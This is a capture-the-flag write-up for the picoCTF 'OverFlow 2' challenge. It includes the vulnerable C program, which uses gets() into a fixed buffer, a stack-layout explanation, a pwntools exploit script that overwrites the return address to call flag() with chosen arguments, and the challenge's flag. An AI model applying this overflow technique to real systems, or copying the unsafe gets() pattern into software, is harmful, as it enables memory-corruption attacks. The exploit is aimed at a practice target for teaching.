# OverFlow 2 - Points: 250

## description

Now try overwriting arguments. Can you get the flag from this [program](./vuln)? You can find it in /problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e on the shell server. [Source](./vuln.c).

## solution

Similar to the previous challenge, we have to overwrite the return address to call the ```flag()``` function.
However, this time, we need to pass the correct arguments, 0xDEADBEEF and 0xC0DED00D, in order to have the flag printed.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

As with OverFlow 1, we need to overflow the memory allocated for local variables and overwrite the EBP and return address.
We can use the same technique of filling the char array buffer, then printing a recognisable pattern, such as the alphabet, and checking the value of the EBP register in GDB.

This time, we need to write past the return address to set the arguments for the ```flag()``` function.
For this challenge, it is very useful to know where arguments are on the stack.

```
Local variables
EBP
Return Address
Arguments
```

We want to overwrite the return address of ```vuln()``` with the address of the ```flag()``` function.
When this happens, the current stack will be destroyed and a new stack will be created like so:

During execution of ```vuln()```:

```
vuln - Local variables
vuln - old EBP
vuln - Return Address
previous stack
```

Finished execution of ```vuln()```:

```
vuln - Arguments
previous stack
```

Start execution of ```flag()```:

```
flag - Local variables
flag - old EBP
previous stack
```

However, the flag function expects that the stack is structured as normal:

```
flag - Local variables
flag - old EBP
flag - Return Address
flag - Arguments
previous stack
```

Using a buffer overflow, we can overwrite memory in the previous stack just as we would overwrite the return address.

We can see that the top of the previous stack has to include the following in order:

```
flag - Return Address
flag - Arguments
```

The return address doesn't matter in this case as we are not concerned with where the program attempts to return to once the flag has been printed.
We can overwrite this value with an arbitrary address, such as 0x41414141.

Once we've filled the return address, we overwrite the next 8 bytes with the correct arguments.
When we're finished, stack will looks something like this:

```
flag - Local variables
flag - old EBP
0x41414141
0xDEADBEEF
0xC0DED00D
remaining previous stack
```

## exploit script

This script is pretty much the same as the one used in OverFlow 1.
The difference is that, after printing the buffer and the address of the ```flag()``` function, we add an arbitrary 4 bytes, followed by the two arguments.

```py
#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e'

print("running vuln")
vuln = conn.process(location + '/vuln', cwd = location)

print("sending payload")
vuln.sendlineafter('\n', ('A' * 188).encode() + p32(0x080485e6) + ('A' * 4).encode() + p32(0xDEADBEEF) + p32(0xC0DED00D))
vuln.recvline()

print("done")
vuln.interactive()
```

Flag: ```picoCTF{arg5_and_r3turn55897b905}```

